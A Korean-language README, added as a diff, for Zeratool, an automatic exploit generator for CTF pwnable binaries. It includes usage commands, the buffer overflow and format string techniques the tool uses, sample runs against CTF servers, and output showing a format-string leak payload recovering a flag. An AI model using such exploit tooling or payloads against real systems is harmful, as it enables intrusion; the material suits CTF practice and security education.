@@ -1,0 +1,93 @@
+# Zeratool
+CTF 포너블 문제를 위한 자동 익스플로잇 생성기와 원격 FLAG 캡쳐 도구
+
+## Introduction
+이 도구는 angr를 통하여 printf 후킹과 제약되지 않은 경로를 찾아 바이너리를 분석하고, pwntools와 스크립트 트릭을 통해 원격 코드 실행을 편하게 해준다. 마지막으로 페이로드가 로컬에서 테스트된 후 리모트 CTF서버에 제출되어 플래그를 얻을 수 있다.
+
+
+[![asciicast](https://asciinema.org/a/188002.png)](https://asciinema.org/a/188002)
+
+## Installing
+Zeratool은 Ubuntu 16.04에서 테스트되었다고하며, 설치 스크립트는 Ubuntu 12.04에서 Ubuntu 18.04까지 지원됩니다.
+```
+./install.sh
+```
+
+## Usage
+Zeratool은 바이너리를 인자로 받아들이고 선택적으로 링크된 libc 라이브러리 및 CTF 서버 연결 정보를 인자로 추가할 수 있는 python 스크립트입니다.
+```
+[chris:~/Zeratool] [angr] python zeratool.py -h
+usage: zeratool.py [-h] [-l LIBC] [-u URL] [-p PORT] [-v] file
+
+positional arguments:
+  file                  File to analyze
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -l LIBC, --libc LIBC  libc to use
+  -u URL, --url URL     Remote URL to pwn
+  -p PORT, --port PORT  Remote port to pwn
+  -v, --verbose         Verbose mode
+```
+
+## Exploit Types
+Zeratool은 Buffer Overflow 및 Format String 버그에 대하여 지원합니다.
+
+* Buffer Overflow
+    * Point program counter to win function
+    * Point program counter to shellcode
+    * Point program counter to rop chain
+        * ROP chains need a libc base address
+        * one-gadget and ropper are used rop chain building
+* Format String
+    * Point GOT entry to win function
+    * Point GOT entry to shellcode
+
+## Examples
+challenges 폴더에 있는 바이너리 혹은 samples.sh를 통해서 어떻게 동작하는지 테스트해 볼 수 있습니다.
+```
+#!/bin/bash
+#Buffer Overflows with win functions
+python zeratool.py challenges/ret -u ctf.hackucf.org -p 9003
+python zeratool.py challenges/bof3 -u ctf.hackucf.org -p 9002
+python zeratool.py challenges/bof2 -u ctf.hackucf.org -p 9001
+python zeratool.py challenges/bof1 -u ctf.hackucf.org -p 9000
+
+#Down for the summer
+#python zeratool.py challenges/easy_format -u tctf.competitivecyber.club -p 7801
+#python zeratool.py challenges/medium_format -u tctf.competitivecyber.club -p 7802
+
+#Format string leak
+python zeratool.py challenges/easy_format
+#Format string point to win function
+python zeratool.py challenges/medium_format
+#Format string point to shellcode
+python zeratool.py challenges/hard_format #This one sometimes needs to be run twice
+
+#Buffer overflow point to shellcode
+python zeratool.py challenges/demo_bin
+```
+
+## Example(easy_format)
+```
+(zeratool) root@5ba1527e39bb:/pwd/Downloads/Zeratool-master# python zeratool.py challenges/easy_format
+[+] Checking pwn type...
+[+] Checking for overflow pwn type...
+[+] Checking for format string pwn type...
+[+] Found symbolic buffer at position 0 of length 49
+[+] Vulnerable path found %x_%
+[+] Triggerable with STDIN : %x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x
+
+[+] Getting binary protections
+[+] Checking for flag leak
+[~] Odd length string detected... Skipping
+[~] Odd length string detected... Skipping
+[~] Odd length string detected... Skipping
+[~] Odd length string detected... Skipping
+[+] Flag found:
+[+] Returned eyU`Zflag{y0u_g0t_1t}
+%x_%8x_%17$08x_%18$08x_%19$08x_%20$08x_%21$08x_%22$08x_%23$08x_%8x_%41$08x_%42$08x_%43$08x_%44$08x_%45$08x_%46$08x_%47$08x
+```
+
+## Reference
+[Zeratool](https://github.com/ChrisTheCoolHut/Zeratool)
